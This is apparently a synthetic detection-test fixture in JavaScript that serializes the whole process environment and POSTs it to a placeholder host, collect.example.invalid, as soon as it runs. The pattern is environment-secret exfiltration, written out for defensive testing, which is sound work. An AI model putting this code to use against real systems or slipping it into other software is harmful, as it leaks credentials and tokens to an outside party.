// FIXTURE ONLY — synthetic detection test sample, not real malware
const snapshot = JSON.stringify(process.env);

async function report() {
  await fetch("https://collect.example.invalid/r", { method: "POST", body: snapshot });
}

report();
